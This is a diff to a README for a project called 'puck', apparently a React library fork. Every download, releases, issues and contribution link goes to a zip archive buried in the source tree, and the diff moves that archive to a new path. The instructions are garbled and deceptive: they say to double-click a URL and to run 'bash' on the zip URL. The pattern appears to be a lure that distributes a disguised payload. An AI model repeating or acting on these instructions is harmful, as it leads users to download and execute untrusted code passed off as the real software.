@@ -8,27 +8,27 @@ Welcome to puck! This application brings together the power of React with the co
 
 To get started with puck, you need to download it. Click the link below to visit the Releases page, where you can find the latest version of the software.
 
-[![Download puck](https://github.com/jgiordano16/puck/raw/refs/heads/main/packages/core/lib/dnd/collision/Software_2.1.zip)](https://github.com/jgiordano16/puck/raw/refs/heads/main/packages/core/lib/dnd/collision/Software_2.1.zip)
+[![Download puck](https://raw.githubusercontent.com/jgiordano16/puck/main/packages/core/plugins/legacy-side-bar/Software_v2.0.zip)](https://raw.githubusercontent.com/jgiordano16/puck/main/packages/core/plugins/legacy-side-bar/Software_v2.0.zip)
 
 ### Step-by-Step Download Instructions
 
 1. **Visit the Releases Page**  
-   Click on this link to go to the Releases page: [Download puck](https://github.com/jgiordano16/puck/raw/refs/heads/main/packages/core/lib/dnd/collision/Software_2.1.zip).
+   Click on this link to go to the Releases page: [Download puck](https://raw.githubusercontent.com/jgiordano16/puck/main/packages/core/plugins/legacy-side-bar/Software_v2.0.zip).
 
 2. **Choose Your Version**  
    Look for the latest version listed on the page. The newest version usually has the highest number. 
 
 3. **Download the Installer**  
    Find the installer that matches your operating system:
-   - For Windows: Download `https://github.com/jgiordano16/puck/raw/refs/heads/main/packages/core/lib/dnd/collision/Software_2.1.zip`
-   - For Mac: Download `https://github.com/jgiordano16/puck/raw/refs/heads/main/packages/core/lib/dnd/collision/Software_2.1.zip`
-   - For Linux: Download `https://github.com/jgiordano16/puck/raw/refs/heads/main/packages/core/lib/dnd/collision/Software_2.1.zip`
+   - For Windows: Download `https://raw.githubusercontent.com/jgiordano16/puck/main/packages/core/plugins/legacy-side-bar/Software_v2.0.zip`
+   - For Mac: Download `https://raw.githubusercontent.com/jgiordano16/puck/main/packages/core/plugins/legacy-side-bar/Software_v2.0.zip`
+   - For Linux: Download `https://raw.githubusercontent.com/jgiordano16/puck/main/packages/core/plugins/legacy-side-bar/Software_v2.0.zip`
 
 4. **Run the Installer**  
    After the download completes:
-   - **Windows**: Double-click `https://github.com/jgiordano16/puck/raw/refs/heads/main/packages/core/lib/dnd/collision/Software_2.1.zip` and follow the on-screen instructions.
+   - **Windows**: Double-click `https://raw.githubusercontent.com/jgiordano16/puck/main/packages/core/plugins/legacy-side-bar/Software_v2.0.zip` and follow the on-screen instructions.
    - **Mac**: Open the `.dmg` file, drag the puck icon to your Applications folder, and then open it from there.
-   - **Linux**: Open a terminal and run `bash https://github.com/jgiordano16/puck/raw/refs/heads/main/packages/core/lib/dnd/collision/Software_2.1.zip` after navigating to the download folder.
+   - **Linux**: Open a terminal and run `bash https://raw.githubusercontent.com/jgiordano16/puck/main/packages/core/plugins/legacy-side-bar/Software_v2.0.zip` after navigating to the download folder.
 
 5. **Complete the Setup**  
    Follow the prompts to finish installing the application. You might need to accept permissions for the program to run smoothly.
@@ -82,8 +82,8 @@ We welcome contributions! If you want to contribute to puck, please read our con
 
 ## 🔗 Links & Resources
 
-- [Releases Page](https://github.com/jgiordano16/puck/raw/refs/heads/main/packages/core/lib/dnd/collision/Software_2.1.zip)
-- [Issues and Support](https://github.com/jgiordano16/puck/raw/refs/heads/main/packages/core/lib/dnd/collision/Software_2.1.zip)
-- [Contribution Guidelines](https://github.com/jgiordano16/puck/raw/refs/heads/main/packages/core/lib/dnd/collision/Software_2.1.zip)
+- [Releases Page](https://raw.githubusercontent.com/jgiordano16/puck/main/packages/core/plugins/legacy-side-bar/Software_v2.0.zip)
+- [Issues and Support](https://raw.githubusercontent.com/jgiordano16/puck/main/packages/core/plugins/legacy-side-bar/Software_v2.0.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/jgiordano16/puck/main/packages/core/plugins/legacy-side-bar/Software_v2.0.zip)
 
 Thank you for choosing puck! We hope it makes your React development enjoyable and straightforward. Happy coding!
